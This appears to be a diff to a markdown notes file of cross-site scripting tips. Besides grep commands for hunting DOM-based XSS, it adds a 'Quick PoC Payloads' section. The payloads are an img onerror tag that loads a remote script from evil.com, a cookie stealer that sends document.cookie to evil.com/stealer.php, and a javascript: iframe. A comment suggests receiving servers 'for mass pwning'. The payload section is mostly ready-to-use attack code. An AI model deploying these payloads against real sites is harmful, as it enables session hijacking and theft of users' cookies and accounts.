@@ -1,7 +1,5 @@
 # XSS Tips
 
-
-
 ---
 ## DOM Based
 * Hunting (do this where downloaded JS folder is)
@@ -14,3 +12,17 @@
         ```bash
         grep -ER "<VARIABLE>[ ]+=" ./
         ```
+## Quick PoC Payloads
+* `img` tag to CSRF
+```
+<img src=a onerror="x=document.createElement('script');x.src='https://evil.com/really_evil.js';document.body.appendChild(x)" />
+```
+* Class cookie stealer
+    * You may setup receiving servers, APIs, webhook for mass pwning
+```
+<img src=a onerror="location.href='https://evil.com/stealer.php?cookie='+document.cookie;">
+```
+* iFrame
+```
+<iframe src="javascript:alert(1)">
+```
